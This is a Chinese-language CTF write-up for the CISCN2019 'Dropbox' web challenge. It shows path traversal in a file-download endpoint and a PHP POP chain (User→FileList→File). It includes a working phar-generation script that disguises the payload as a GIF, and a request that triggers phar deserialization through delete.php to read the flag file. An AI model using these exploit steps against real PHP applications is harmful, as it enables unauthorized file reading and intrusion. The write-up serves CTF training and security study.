---
title: CISCN2019 - Web - Dropbox
date: 2026-11-14 18:06:00
categories:
  - CTF
  - CISCN2019
  - Web
tags:
  - PHAR反序列化
  - POP链
  - 任意文件下载
  - open_basedir绕过
  - 目录穿越
cover: /img/cover/petal-smiley-faces.jpg
description: 网盘题，目录穿越可下源码但受 open_basedir 与 flag 过滤限制；构造 User→FileList→File 的 POP 链生成 phar 上传，借 delete.php 的 file_exists 触发反序列化读 flag。
keywords:
  - PHAR反序列化
  - POP链
  - 任意文件下载
  - open_basedir
  - CISCN
ai: >-
  CISCN2019 网盘题 Dropbox，环境 PHP 5.6.40。download.php 目录穿越可下源码，但 open_basedir 与 flag 过滤挡住直接读取。审计 class.php 得 POP 链：User 析构调用 db->close()，db 设为 FileList 触发 __call，遍历调用 File::close() 即 file_get_contents，结果由析构表格回显。构造含该对象的 phar 伪装 GIF 上传，delete.php 提交 phar://avatar.gif 经 file_exists 隐式反序列化触发链读 /flag.txt 回显。
copyright_author: Hunter
---

> 结论先行：`download.php` 目录穿越只能下源码（open_basedir + flag 过滤）；构造 `User→FileList→File` POP 链的 phar 上传，用 `delete.php` 的 `file_exists('phar://...')` 触发反序列化读 `/flag.txt`。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CISCN2019 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

| 项目 | 内容 |
|------|------|
| 平台 | BUUCTF 练习场 |
| 服务器环境 | PHP/5.6.40 + openresty + MySQL |

知识点：任意文件下载（目录穿越）、`open_basedir` 绕过、PHAR 反序列化 RCE（文件读取）。

### 攻击链总览

```text
注册登录网盘
  → download.php 任意文件下载（filename=../../xxx.php）下载源码
  → 审计 class.php，确认 POP 链
  → 构造 phar（stub=GIF89a，metadata 为精心构造的对象）
  → upload.php 上传 phar（伪装 image/gif）
  → delete.php filename=phar://avatar.gif 触发反序列化读 /flag.txt
```

## 信息收集

注册并登录后进入网盘界面，发现下载接口存在任意文件下载漏洞。

`download.php` 关键代码：

```php
chdir($_SESSION['sandbox']);           // 切换到 sandbox 目录 uploads/sha1(username+"sftUahRiTz")/
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
}
```

- `$filename` 未做路径过滤，可目录穿越。
- `open_basedir` 设为 `getcwd() . ":/etc:/tmp"`（getcwd 在 chdir 前为 web 根目录 `/var/www/html`），因此可访问整个 web 根目录。
- 但 `stristr($filename, "flag")` 过滤了 "flag" 字符串，且 open_basedir 不含根目录 `/`，所以**无法直接读 flag**。

利用 `filename=../../index.php` 等下载源码（sandbox 在 web 根下两层，`../../` 回到 web 根）。下载到关键文件：`index.php`、`download.php`、`delete.php`、`class.php`、`upload.php`。

## 漏洞分析

### 审计 class.php（POP 链核心）

```php
class User {
    public $db;
    public function __destruct() {
        $this->db->close();          // ① 析构时调用 $db->close()
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __call($func, $args) {   // ② FileList 没有 close()，触发 __call
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();   // ③ 调用 File::close()
        }
    }

    public function __destruct() {           // ④ 析构时输出 results 表格（回显点）
        $table = '...';
        foreach ($this->results as $filename => $result) {
            foreach ($result as $func => $value) {
                $table .= '<td>' . htmlentities($value) . '</td>';
            }
        }
        echo $table;
    }
}

class File {
    public $filename;
    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {   // ⑤ phar 触发点
            return true;
        }
        return false;
    }
    public function close() {
        return file_get_contents($this->filename);            // ⑥ 读文件
    }
}
```

### POP 链构造

```text
User::__destruct()
  → $this->db->close()          （$db 是 FileList 对象，FileList 无 close()）
  → FileList::__call('close')
  → 遍历 $this->files，调用 $file->close()
  → File::close() → file_get_contents($this->filename)
  → 结果存入 FileList::$results
  → FileList::__destruct() 输出表格（回显 flag）
```

构造对象：

```php
$o = new User();
$o->db = new FileList('/flag.txt');   // FileList::$files = [File(filename='/flag.txt')]
```

## 利用过程

### 1. 生成 phar

```php
class User { public $db; }
class File { public $filename; }
class FileList {
    private $files; private $results; private $funcs;
    public function __construct($fn) {
        $f = new File(); $f->filename = $fn;
        $this->files = array($f);
        $this->results = array(); $this->funcs = array();
    }
}
$o = new User();
$o->db = new FileList('/flag.txt');

@unlink('avatar.phar.gif');
$phar = new Phar('avatar.phar.gif');
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");  // 伪装 GIF
$phar->setMetadata($o);                                 // 反序列化 payload
$phar->addFromString("foo.txt", "bar");
$phar->stopBuffering();
```

用 `php -d phar.readonly=0 gen_phar.php` 生成。

### 2. 上传 phar

`upload.php` 关键代码：

```php
$filename = $_FILES["file"]["name"];
$pos = strrpos($filename, ".");
if ($pos !== false) {
    $filename = substr($filename, 0, $pos);   // 去掉扩展名
}
$fileext = ".gif";   // 根据 Content-Type 决定 .gif/.jpg/.png
switch ($_FILES["file"]["type"]) {
    case 'image/gif':  $fileext = ".gif"; break;
    case 'image/jpeg': $fileext = ".jpg"; break;
    case 'image/png':  $fileext = ".png"; break;
    default: die("Only gif/jpg/png allowed");
}
$dst = $_SESSION['sandbox'] . $filename . $fileext;
move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
```

上传时设置 `Content-Type: image/gif`，文件名传 `avatar`，最终存储为 `uploads/sha1(...)/avatar.gif`（内容仍是 phar）。

### 3. 触发反序列化读 flag

`delete.php` **没有 open_basedir 限制，也没有 "flag" 过滤**：

```php
chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {   // file_exists 触发 phar
    $file->detele();
    ...
}
```

POST `delete.php`，`filename=phar://avatar.gif`，`File::open()` 中的 `file_exists('phar://avatar.gif')` 触发 phar 反序列化，POP 链执行，`FileList::__destruct` 输出表格回显 flag。

## 完整 EXP

复现脚本清单（见本地 WP 归档）：

- `gen_phar.php`：生成 phar（metadata 为 POP 链对象）
- `step1_register.py`：注册登录
- `step2b_download_src.py`：任意文件下载源码
- `step4_upload_phar.py`：上传 phar
- `step5_trigger.py`：delete.php 触发反序列化读 flag

生成 phar 命令：

```bash
php -d phar.readonly=0 gen_phar.php
```

触发反序列化（伪代码，用 python 表达请求）：

```python
import urllib.request, urllib.parse

# 登录后，用删除接口触发 phar:// 反序列化
data = urllib.parse.urlencode({'filename': 'phar://avatar.gif'}).encode()
req = urllib.request.Request('http://target:8080/delete.php', data=data, method='POST')
print(urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'ignore'))
```

## Flag

```text
flag{xxxx}
```

（从回显表格 `filename="flag.txt"` 确认 flag 文件位置为 `/flag.txt`。）

## 踩坑与总结

1. **`download.php` 有双重限制**（open_basedir + "flag" 过滤），只能下载源码，不能直接读 flag。
2. **`delete.php` 是理想触发点**：无 open_basedir 限制、无 "flag" 过滤，且 `File::open()` 的 `file_exists()` 会触发 phar 反序列化。
3. **flag 文件位置**：`/flag.txt`（从回显的 `filename="flag.txt"` 确认）。
4. **PHP 5.6.40** 的 phar 流包装器会对 metadata 隐式反序列化，这是利用前提（PHP 8 已移除该行为）。
5. upload.php 只改扩展名不改内容，是 phar 能伪装成 gif 的关键。
